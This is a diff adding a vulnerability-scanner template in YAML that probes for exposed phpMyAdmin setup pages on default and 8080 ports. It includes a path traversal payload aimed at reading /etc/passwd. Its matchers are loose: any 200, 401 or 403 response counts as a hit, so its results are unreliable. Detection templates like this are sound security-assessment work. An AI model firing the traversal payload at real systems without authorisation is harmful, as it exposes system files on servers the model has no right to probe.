@@ -1,0 +1,63 @@
+id: phpmyadmin-misconfig
+info:
+  name: phpMyAdmin Misconfiguration Detection
+  author: pwn
+  severity: high
+  description: Detects exposed phpMyAdmin instances with accessible sensitive endpoints or vulnerable to path traversal, potentially leading to unauthorized access or system file exposure.
+  tags: phpmyadmin, misconfiguration, path-traversal
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/Admin/setup/index.php"
+      - "{{BaseURL}}/admin/phpMyAdmin/setup/index.php"
+      - "{{BaseURL}}/admin/pma/setup/index.php"
+      - "{{BaseURL}}/phpMyAdmin/main.php"
+      - "{{BaseURL}}/phpmyadmin/admin/setup/index.php"
+      - "{{BaseURL}}/phpmyadmin/pma/"
+      - "{{BaseURL}}/phpmyadmin/scripts/setup.php"
+      - "{{BaseURL}}/phpmyadmin/setup/"
+      - "{{BaseURL}}/phpmyadmin/setup/index.php"
+      - "{{BaseURL}}/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd"
+      - "{{BaseURL}}/scripts/setup.php"
+      - "{{BaseURL}}:8080/Admin/setup/index.php"
+      - "{{BaseURL}}:8080/admin/phpMyAdmin/setup/index.php"
+      - "{{BaseURL}}:8080/admin/pma/setup/index.php"
+      - "{{BaseURL}}:8080/phpMyAdmin/main.php"
+      - "{{BaseURL}}:8080/phpmyadmin/admin/setup/index.php"
+      - "{{BaseURL}}:8080/phpmyadmin/pma/"
+      - "{{BaseURL}}:8080/phpmyadmin/scripts/setup.php"
+      - "{{BaseURL}}:8080/phpmyadmin/setup/"
+      - "{{BaseURL}}:8080/phpmyadmin/setup/index.php"
+      - "{{BaseURL}}:8080/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd"
+      - "{{BaseURL}}:8080/scripts/setup.php"
+    matchers-condition: or
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "phpMyAdmin"
+          - "PMA"
+          - "passwd"
+        part: body
+        condition: or
+        case-insensitive: true
+      - type: word
+        words:
+          - "phpMyAdmin"
+        part: body
+        condition: or
+        case-insensitive: true
+      - type: status
+        status:
+          - 403
+          - 401
+    extractors:
+      - type: regex
+        name: matched_path
+        part: request
+        regex:
+          - "https?://[^/]+(/.*)"
+        group: 1
